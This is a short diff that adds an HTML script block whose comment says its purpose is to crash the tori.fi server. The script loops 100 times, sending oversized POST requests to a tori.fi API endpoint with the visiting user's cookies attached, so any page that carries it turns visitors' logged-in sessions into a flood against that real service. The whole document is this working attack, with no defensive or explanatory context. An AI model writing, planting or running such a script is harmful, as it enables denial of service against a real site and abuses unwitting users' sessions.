@@ -1,0 +1,12 @@
+<script>
+// Crash tori.fi server for the logged-in user
+for (let i = 0; i < 100; i++) {
+  fetch('https://www.tori.fi/favorite-frontend-api', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({name: 'X'.repeat(10000)}),
+    credentials: 'include'
+  })
+}
+</script>
+
